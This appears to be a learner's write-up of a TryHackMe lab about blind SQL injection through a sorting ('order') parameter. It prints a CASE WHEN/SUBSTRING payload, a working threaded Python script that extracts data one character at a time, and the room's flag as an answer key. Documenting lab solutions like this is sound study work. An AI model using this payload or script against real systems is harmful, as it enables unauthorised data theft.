# Prioritise

**Platform:** TryHackMe  
**Date:** 2026-08-22
**Difficulty:** Medium 🟡  
**Category:** Web Application / SQL Injection  
**Room URL:** https://tryhackme.com/room/prioritise
**Status:** ✅ Completed

---

## 📌 What Was This Room About?

> This challenge was about finding and exploiting a blind SQL injection in an `ORDER BY` parameter. The database doesn't just hand us the flag, so we have to basically ask it yes/no questions and use the way the webpage sorts itself as our signal. 😏

---

## 🔍 Reconnaissance

The application had a sorting parameter called `order`:

```text
http://<MACHINE_IP>/?order=title
```

Changing the value changed how the results were displayed.

That immediately made the parameter interesting because our input was clearly affecting how the backend handled the database query.

---

## 🧭 Steps I Took

### Step 1 — Finding the Injection Point

- **What I did:** Tested the `order` parameter and changed its value from the normal `title` value.
    
- **Command/Tool used:** Browser
    

```text
http://<MACHINE_IP>/?order=title
```

- **What I found:** The page sorted the results based on the value supplied in `order`.
    
- **Why it matters:** User-controlled input was being passed into the SQL sorting logic. That made this parameter a good candidate for SQL injection.
    

---

### Step 2 — Confirming the SQL Injection

I started modifying the value supplied to `order` and watched how the application responded.

Normal input worked:

```text
?order=title
```

But unusual input caused the application's behavior to change and eventually produced errors.

That was enough to confirm that the parameter wasn't being handled safely.

The important thing here was that I wasn't getting a nice SQL error telling me exactly what was happening. I had to use the application's behavior as the signal.

---

### Step 3 — Understanding the Blind SQL Injection

This turned out to be an **ORDER BY-based blind SQL injection**.

Basically, the database doesn't directly show us the information we're looking for. Instead, I can make the database choose between two different sorting options depending on whether a condition is true or false.

The idea was:

```text
TRUE  → sort by title
FALSE → sort by date
```

So I could ask questions like:

> "Is the first character of the flag `f`?"

If the page sorted one way, the answer was **yes**.

If it sorted the other way, the answer was **no**.

Then I could move onto the next character.

---

### Step 4 — Building the SQL Payload

The payload I used was:

```sql
(CASE WHEN (SELECT SUBSTRING(flag,1,1) FROM flag)="f" THEN title ELSE date END)
```

The important part is:

```sql
CASE WHEN <condition> THEN title ELSE date END
```

So if my condition is true, the database uses `title` for sorting.

If it's false, it uses `date`.

I could then change:

```text
SUBSTRING(flag,1,1)
```

to:

```text
SUBSTRING(flag,2,1)
SUBSTRING(flag,3,1)
SUBSTRING(flag,4,1)
```

and so on.

That let me recover the flag **one character at a time**.

---

### Step 5 — Automating It With Python

Doing this manually for every character would be painful, so I wrote a Python script to automate the process.

```python
import requests, string, concurrent.futures

TARGET_URL = "http://<MACHINE_IP>/?order="

s = requests.Session()
base = s.get(TARGET_URL + "title").text

chars = string.ascii_letters + string.digits + "{}"

flag = ""
pos = 1

def test(c):
    q = f'(CASE WHEN (SELECT SUBSTRING(flag,1,{pos}) FROM flag)="{flag+c}" THEN title ELSE date END)'
    return c if s.get(TARGET_URL + q).text == base else None

with concurrent.futures.ThreadPoolExecutor(20) as ex:
    while not flag.endswith("}"):
        for r in ex.map(test, chars):
            if r:
                flag += r
                pos += 1
                print(flag)
                break
```

The script basically does this:

1. Gets a normal page response to use as the baseline.
    
2. Creates a list of possible characters.
    
3. Tests each character against the current position of the flag.
    
4. Checks whether the response matches the expected result.
    
5. Adds the correct character to the flag.
    
6. Moves to the next position.
    
7. Keeps going until the flag ends with `}`.
    

So instead of sitting there asking the database questions myself, I made Python do it. 😂

---

## 🛠 Commands / Tools Used

|Command / Tool|What It Does|
|---|---|
|Browser|Tests the `order` parameter and observes sorting behavior|
|`requests`|Sends HTTP requests from Python|
|`string`|Provides the characters to test|
|`ThreadPoolExecutor`|Tests multiple possible characters concurrently|
|`CASE WHEN`|Creates the true/false condition used by the injection|
|`SUBSTRING()`|Extracts individual characters from the flag|

---

## 🚩 Flags Found

| Flag | Value                                    |
| ---- | ---------------------------------------- |
| Flag | `flag{65f2f8cfd53d59422f3d7cc62cc8fdcd}` |

---


## 📎 Resources Used

- TryHackMe challenge
    
- Python `requests` documentation
    
- OWASP SQL Injection resources
    

---
